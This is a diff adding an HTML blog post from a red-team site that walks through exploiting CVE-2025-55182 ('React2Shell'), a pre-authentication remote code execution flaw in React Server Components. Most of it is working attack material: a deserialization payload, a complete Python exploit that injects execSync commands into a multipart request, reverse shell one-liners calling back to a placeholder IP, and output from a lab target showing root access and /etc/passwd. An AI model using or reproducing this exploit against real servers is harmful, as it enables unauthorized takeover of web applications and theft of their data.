@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>React2Shell with Python Automation: Getting Pwned in One Minute // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="LinkedIn">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Tue 9 Dec 2025</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>React2Shell with Python Automation: Getting Pwned in One Minute</h1>
+                <p class="post-tags">Tags: <a href="#">Pentesting</a> · <a href="#">Web Exploitation</a> · <a href="#">React</a> · <a href="#">OWASP Injection</a></p>
+
+                <p class="post-meta">Blog released: 2025 Tue 9 Dec.</p>
+
+                <h1>Overview</h1>
+
+                <p>This vuln is <ins>CVSS 10.0</ins> pre-authentication RCE affecting React Server Components. Amid the flood of fake proof-of-concept exploits, scanners, exploits, and widespread misconceptions, this technical analysis intends to cut through the noise.</p>
+
+                <p>In a way, this is a very massive <code>0 day</code> and very dangerous CVE on React, which highly used in Web and Production. An exploits emerged for React2Shell, a critical vulnerability in React Server Components affecting React 19 and frameworks that use it like Next JS.</p>
+
+                <div class="video-container">
+                <img alt="react2shell-target-overview" width="60%" src="../images/r2s-photo-2.png"></iframe>
+                </div>
+                
+                <h2>React2Shell Analysis <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-55182"><ins>CVE-2025-55182</ins></a></h2>
+                
+                <p>Which is a pre-authentication remote code execution vulnerability exists in React Server Components versions <code>19.0.0, 19.1.0, 19.1.1,</code> and <code>19.2.0</code> including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack.</p> 
+                
+                <p>The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.</p>
+
+                <h2>Simple Exploit Explained</h2>
+
+                <p>This section demonstrates that exploitation doesn't require complex setup: just a single HTTP request. The complete payload requires no <code>__proto__</code> access (contrary to many circulating PoC that use it):</p>
+                
+                <pre><code class="language-plaintext">{ 
+  0: { 
+    status: "resolved_model", 
+    reason: -1,                    
+    _response: { 
+      _prefix: "console.log('RCE')//",         
+      _formData: { get: "$1:then:constructor" },  
+    }, 
+    then: "$1:then",               
+    value: '{"then":"$B"}',   
+  }, 
+  1: "$@0",                        
+}</code></pre>
+
+                <div class="video-container">
+                <img alt="react2shell-target-overview" width="60%" src="../images/r2s-photo.png"></iframe>
+                </div>
+                
+                <p>Most people uses RSC Security Tool Extension, however I've created this <a href="https://gist.github.com/byt3n33dl3/be855564f3fb24303d74f4380519a0d1"><ins>Python script</ins></a> to automated this processes</p>
+                
+                <pre><code class="language-plaintext">#!/usr/bin/env python3
+"""
+React2Shell Exploit for covering CVE-2025-55182
+"""
+
+import requests
+import sys
+import argparse
+import re
+import json
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def create_multipart_body(command):
+    """
+    Generate the exact multipart payload that matches the working PoC
+    """
+    
+    injection = (
+        f"var res=process.mainModule.require('child_process')"
+        f".execSync('{command}',{{'timeout':5000}}).toString(). trim();;"
+        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
+    )
+    
+    payload_json = json.dumps({
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": "{\"then\":\"$B1337\"}",
+        "_response": {
+            "_prefix": injection,
+            "_chunks": "$Q2",
+            "_formData": {
+                "get": "$1:constructor:constructor"
+            }
+        }
+    })
+    
+    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+    
+    body = (
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f"Content-Disposition: form-data; name=\"0\"\r\n"
+        f"\r\n"
+        f"{payload_json}\r\n"
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f"Content-Disposition: form-data; name=\"1\"\r\n"
+        f"\r\n"
+        f"\"$@0\"\r\n"
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f"Content-Disposition: form-data; name=\"2\"\r\n"
+        f"\r\n"
+        f"[]\r\n"
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
+    )
+    
+    return body, boundary
+
+def extract_output(response_text):
+    """
+    Extract command output from RSC response
+    The output appears in format: 1:E{"digest":"OUTPUT_HERE"}
+    """
+    
+    patterns = [
+        r'1:E\{"digest":"([^"]*)"\}',
+        r'"digest":"([^"]*)"',
+        r'"digest":`([^`]*)`',
+        r'E\{"digest":"([^"]*)"\}',
+    ]
+    
+    for pattern in patterns:
+        match = re. search(pattern, response_text)
+        if match:
+            output = match.group(1)
+            output = output.replace('\\n', '\n')
+            output = output.replace('\\t', '\t')
+            output = output.replace('\\r', '\r')
+            return output
+    
+    return None
+
+def exploit(target, command, proxy=None, verbose=False):
+    """Execute the exploit"""
+    
+    url = target. rstrip('/')
+    body, boundary = create_multipart_body(command)
+    
+    headers = {
+        "User-Agent": "Mozilla/5. 0 (Windows NT 10. 0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0. 0",
+        "Next-Action": "x",
+        "X-Nextjs-Request-Id": "b5dce965",
+        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
+        "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad",
+    }
+    
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    
+    try:
+        if verbose:
+            print(f"[DEBUG] Sending request to {url}")
+            print(f"[DEBUG] Command: {command}")
+        
+        response = requests.post(
+            url, 
+            data=body, 
+            headers=headers, 
+            proxies=proxies,
+            verify=False,
+            timeout=15
+        )
+        
+        if verbose:
+            print(f"[DEBUG] Status: {response.status_code}")
+            print(f"[DEBUG] Response:\n{response.text[:500]}")
+        
+        output = extract_output(response.text)
+        
+        if output:
+            return True, output
+        else:
+            return False, f"Could not parse output.  Raw response:\n{response.text}"
+        
+    except requests.exceptions.Timeout:
+        return False, "Request timed out (command may still have executed)"
+    except Exception as e:
+        return False, str(e)
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='React2Shell Exploit - CVE-2025-55182',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python3 CVE-2025-55182.py -t https://dev.target.local -c "id"
+  python3 CVE-2025-55182.py -t https://dev.target.local -c "cat /etc/passwd"
+  python3 CVE-2025-55182.py -t https://dev.target.local -i
+  python3 CVE-2025-55182.py -t https://dev.target.local -c "whoami" -v
+        """
+    )
+    parser.add_argument('-t', '--target', required=True, help='Target URL')
+    parser.add_argument('-c', '--command', default='id', help='Command to execute')
+    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
+    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
+    
+    args = parser.parse_args()
+    
+    banner = r"""
+    .______       _______     ___       ______ .___________. __   __       _______. __    __   _______  __       __      
+    |   _  \     |   ____|   /   \     /      ||           ||  | |  |     /       ||  |  |  | |   ____||  |     |  |     
+    |  |_)  |    |  |__     /  ^  \   |  ,----'`---|  |----`|  | |  |    |   (----`|  |__|  | |  |__   |  |     |  |     
+    |      /     |   __|   /  /_\  \  |  |         |  |     |  | |  |     \   \    |   __   | |   __|  |  |     |  |     
+    |  |\  \----.|  |____ /  _____  \ |  `----.    |  |     |  | |  | .----)   |   |  |  |  | |  |____ |  `----.|  `----.
+    | _| `._____||_______/__/     \__\ \______|    |__|     |__| |__| |_______/    |__|  |__| |_______||_______||_______|
+    """
+    print(banner)
+    
+    if args.interactive:
+        print(f"[*] Interactive mode - Target: {args.target}")
+        print("[*] Type 'exit' or 'quit' to exit")
+        print("[*] Type 'shell' for reverse shell helper\n")
+        
+        while True:
+            try:
+                cmd = input("\033[91mreact2shell\033[0m> ").strip()
+                
+                if cmd.lower() in ['exit', 'quit']:
+                    print("[*] Exiting...")
+                    break
+                    
+                if not cmd:
+                    continue
+                
+                if cmd.lower() == 'shell':
+                    print("\n[*] Reverse Shell Commands:")
+                    print("    bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'")
+                    print("    nc -e /bin/sh YOUR_IP 9001")
+                    print("    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f")
+                    print("")
+                    continue
+                
+                if cmd.lower() == 'help':
+                    print("\n[*] Commands:")
+                    print("    <any command>  - Execute on target")
+                    print("    shell          - Show reverse shell helpers")
+                    print("    exit/quit      - Exit interactive mode")
+                    print("")
+                    continue
+                    
+                success, output = exploit(args.target, cmd, args.proxy, args.verbose)
+                
+                if success:
+                    print(output)
+                else:
+                    print(f"\033[93m[-] {output}\033[0m")
+                    
+            except KeyboardInterrupt:
+                print("\n[! ] Interrupted")
+                break
+            except EOFError:
+                break
+    else:
+        print(f"[*] Target: {args.target}")
+        print(f"[*] Command: {args.command}\n")
+        
+        success, output = exploit(args.target, args.command, args.proxy, args.verbose)
+        
+        if success:
+            print(f"\033[92m[+] SUCCESS!\033[0m\n")
+            print(output)
+        else:
+            print(f"\033[91m[-] FAILED\033[0m\n")
+            print(output)
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+                <p>Let's use this in action.</p>
+
+                <h1>CVE-2025-55182.py in Action</h1>
+
+                <p>Let's say this is our target: <code>http://react-rce.vuln:30502/</code></p>
+
+                <p>Target Overview</p>
+
+                <div class="video-container">
+                <img alt="react2shell-target-overview" width="100%" src="../images/react2shell-target-overview-1.jpeg"></iframe>
+                </div>
+
+                <p>Which has no issue on the surfaces.</p>
+
+                <div class="video-container">
+                <img alt="react2shell-target-overview" width="100%" src="../images/react2shell-target-overview-2.jpeg"></iframe>
+                </div>
+
+                <p>Let's now see how <a href="https://gist.github.com/byt3n33dl3/be855564f3fb24303d74f4380519a0d1"><ins>CVE-2025-55182.py</ins></a> in action look like:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ls
+CVE-2025-55182.py</code></pre>
+
+                <p>Usage Help Overview with <code>-h</code></p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ./CVE-2025-55182.py -h           
+usage: CVE-2025-55182.py [-h] -t TARGET [-c COMMAND] [-p PROXY] [-i] [-v]
+
+React2Shell Exploit - CVE-2025-55182
+
+options:
+  -h, --help            show this help message and exit
+  -t, --target TARGET   Target URL
+  -c, --command COMMAND
+                        Command to execute
+  -p, --proxy PROXY     Proxy URL (e.g., http://127.0.0.1:8080)
+  -i, --interactive     Interactive mode
+  -v, --verbose         Verbose output
+
+Examples:
+  python3 CVE-2025-55182.py -t https://dev.target.local -c "id"
+  python3 CVE-2025-55182.py -t https://dev.target.local -c "cat /etc/passwd"
+  python3 CVE-2025-55182.py -t https://dev.target.local -i
+  python3 CVE-2025-55182.py -t https://dev.target.local -c "whoami" -v</code></pre>
+
+                <p>From here I hope it can be seen how simple it is, <code>-c</code> for command RCE check, as universal supposed "whomai" are the best for all OS. And if you wanted to get call-back connection Shell just change the command to <code>-i</code> and you should get call-back.</p>
+
+                <p>PS, the <code>-i</code> would automatically trace your IP and <ins>use port 9001,</ins> so make sure it's not on use when launch.</p>
+                
+                <p>Out-come from <code>-c</code> [command]</p>
+                
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ./CVE-2025-55182.py -t http://react-rce.vuln:30502/ -c id
+
+    .______       _______     ___       ______ .___________. __   __       _______. __    __   _______  __       __      
+    |   _  \     |   ____|   /   \     /      ||           ||  | |  |     /       ||  |  |  | |   ____||  |     |  |     
+    |  |_)  |    |  |__     /  ^  \   |  ,----'`---|  |----`|  | |  |    |   (----`|  |__|  | |  |__   |  |     |  |     
+    |      /     |   __|   /  /_\  \  |  |         |  |     |  | |  |     \   \    |   __   | |   __|  |  |     |  |     
+    |  |\  \----.|  |____ /  _____  \ |  `----.    |  |     |  | |  | .----)   |   |  |  |  | |  |____ |  `----.|  `----.
+    | _| `._____||_______/__/     \__\ \______|    |__|     |__| |__| |_______/    |__|  |__| |_______||_______||_______|
+    
+[*] Target: http://react-rce.vuln:30502/
+[*] Command: id
+
+[+] SUCCESS!
+
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</code></pre>
+
+                <p>Another example:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ./CVE-2025-55182.py -t http://react-rce.vuln:30502/ -c "ls -ltr"
+
+    .______       _______     ___       ______ .___________. __   __       _______. __    __   _______  __       __      
+    |   _  \     |   ____|   /   \     /      ||           ||  | |  |     /       ||  |  |  | |   ____||  |     |  |     
+    |  |_)  |    |  |__     /  ^  \   |  ,----'`---|  |----`|  | |  |    |   (----`|  |__|  | |  |__   |  |     |  |     
+    |      /     |   __|   /  /_\  \  |  |         |  |     |  | |  |     \   \    |   __   | |   __|  |  |     |  |     
+    |  |\  \----.|  |____ /  _____  \ |  `----.    |  |     |  | |  | .----)   |   |  |  |  | |  |____ |  `----.|  `----.
+    | _| `._____||_______/__/     \__\ \______|    |__|     |__| |__| |_______/    |__|  |__| |_______||_______||_______|
+    
+[*] Target: http://react-rce.vuln:30502/
+[*] Command: ls -ltr
+
+[+] SUCCESS!
+
+total 20
+-rw-r--r--    1 root     root           558 Dec  5 14:40 package.json
+-rw-r--r--    1 root     root          6331 Dec  5 14:40 server.js
+drwxr-xr-x   13 root     root          4096 Dec  5 14:40 node_modules
+drwxr-xr-x    2 root     root          4096 Dec  5 14:40 public
+</code></pre>
+
+                <p>Which is dope yeah, we can now saw everything.</p>
+
+                <p>And lastly the <code>-i</code> for interactive shell command:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ./CVE-2025-55182.py -t http://react-rce.vuln:30502/ -i          
+
+    .______       _______     ___       ______ .___________. __   __       _______. __    __   _______  __       __      
+    |   _  \     |   ____|   /   \     /      ||           ||  | |  |     /       ||  |  |  | |   ____||  |     |  |     
+    |  |_)  |    |  |__     /  ^  \   |  ,----'`---|  |----`|  | |  |    |   (----`|  |__|  | |  |__   |  |     |  |     
+    |      /     |   __|   /  /_\  \  |  |         |  |     |  | |  |     \   \    |   __   | |   __|  |  |     |  |     
+    |  |\  \----.|  |____ /  _____  \ |  `----.    |  |     |  | |  | .----)   |   |  |  |  | |  |____ |  `----.|  `----.
+    | _| `._____||_______/__/     \__\ \______|    |__|     |__| |__| |_______/    |__|  |__| |_______||_______||_______|
+    
+[*] Interactive mode - Target: http://react-rce.vuln:30502/
+[*] Type 'exit' or 'quit' to exit
+[*] Type 'shell' for reverse shell helper
+
+react2shell> whoami
+root
+react2shell> cat /etc/passwd
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+node:x:1000:1000::/home/node:/bin/sh
+react2shell> exit
+[*] Exiting...</code></pre>
+
+                <p>That's it, we manage to Pwned the React2Shell labs.</p>
+
+                <div class="video-container">
+                <img alt="react2shell-target-overview" width="100%" src="../images/react2shell-pwned.jpeg"></iframe>
+                </div>
+
+                <h1>Shout Outs</h1>
+
+                <p>To Researchers and News for this to Happened</p>
+
+                <ul>
+                    <li><a href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components">React DEV</a></li>
+                    <li><a href="https://gist.github.com/byt3n33dl3/be855564f3fb24303d74f4380519a0d1">CVE-2025-55182.py</a></li>
+                </ul>
+                
+                <p>Happy hacking!</p>
+
+                <p>Moreover, <a href="mailto:byt3n33dl3@pm.me"><ins>Proton me</ins></a> if you have further question and suggestion.</p>
+                
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2024 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
